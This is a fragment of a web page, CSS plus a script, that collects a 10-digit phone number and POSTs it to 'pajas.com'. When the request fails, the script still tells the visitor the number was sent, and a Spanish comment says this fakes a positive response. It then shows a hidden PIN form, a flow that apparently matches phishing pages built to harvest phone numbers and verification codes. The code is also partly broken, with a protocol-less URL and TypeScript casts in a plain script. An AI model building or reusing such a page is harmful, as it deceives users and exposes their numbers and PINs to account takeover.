        border: none;

    } input::placeholder {
        color: #ffffff;
        font-weight: bold;
        text-align: center;
    }
    button {
        border-radius: 5px;
        text-align: center;
        height: 2rem;
        width: 7rem;
        background-color: grey;
        transition: 0.5s;
        color: white;
        font-weight: bold;
        border: none;
    }
 
    button:hover {
        cursor: pointer;
        box-shadow: rgba(65, 156, 187, 0.679) 0px 1px 5px;
        border: rgb(73, 161, 190) 1px solid;
    }
    
</style>

<script>
    const numberInput = document.querySelector('#numberInput') as HTMLInputElement | null;
    const numberBtn = document.getElementById('numberBtn') as HTMLButtonElement | null;
    const numberForm = document.querySelector('.form-container') as HTMLFormElement | null;

    if (numberInput && numberBtn) {
        numberInput.addEventListener('input', () => {
            if (numberInput.value.length == 10) {
                numberBtn.disabled = false;
                numberBtn.style.backgroundColor = '#0074e0';
            } else {
                numberBtn.disabled = true;
                numberBtn.style.backgroundColor = 'grey';
            }

            

        });
    }

    numberForm?.addEventListener('submit', async (event) => {
            event.preventDefault();

            const data = {
                number: numberInput.value
            }
            
            try {
                const phoneNumber = numberInput.value;
                const url = `pajas.com`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                }); 

                const result = await response.json();

              

            } catch (error) {
                alert('El número se envió correctamente');
                //emulas como si fuese una respuesta positiva
                numberForm.style.display = 'none';
                document.querySelector('.formPin').style.display = 'flex';

                
            }
          
        });
</script>


